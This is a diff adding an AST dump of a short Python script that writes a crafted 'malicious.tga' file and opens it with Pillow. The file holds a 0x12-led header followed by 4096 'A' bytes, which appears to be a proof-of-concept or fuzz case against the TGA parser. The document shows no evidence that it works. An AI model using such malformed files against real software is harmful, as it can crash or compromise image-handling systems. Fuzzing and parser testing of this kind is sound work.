@@ -1,0 +1,73 @@
+Module(
+    body=[
+        ImportFrom(
+            module='PIL',
+            names=[
+                alias(name='Image')],
+            level=0),
+        With(
+            items=[
+                withitem(
+                    context_expr=Call(
+                        func=Name(id='open', ctx=Load()),
+                        args=[
+                            Constant(value='malicious.tga'),
+                            Constant(value='wb')],
+                        keywords=[]),
+                    optional_vars=Name(id='f', ctx=Store()))],
+            body=[
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='f', ctx=Load()),
+                            attr='write',
+                            ctx=Load()),
+                        args=[
+                            Constant(value=b'\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='f', ctx=Load()),
+                            attr='write',
+                            ctx=Load()),
+                        args=[
+                            BinOp(
+                                left=Constant(value=b'A'),
+                                op=Mult(),
+                                right=Constant(value=4096))],
+                        keywords=[]))]),
+        Try(
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='img', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='Image', ctx=Load()),
+                            attr='open',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='malicious.tga')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            Constant(value='Image opened successfully!')],
+                        keywords=[]))],
+            handlers=[
+                ExceptHandler(
+                    type=Name(id='Exception', ctx=Load()),
+                    name='e',
+                    body=[
+                        Expr(
+                            value=Call(
+                                func=Name(id='print', ctx=Load()),
+                                args=[
+                                    Constant(value='Error opening image:'),
+                                    Name(id='e', ctx=Load())],
+                                keywords=[]))])],
+            orelse=[],
+            finalbody=[])],
+    type_ignores=[])
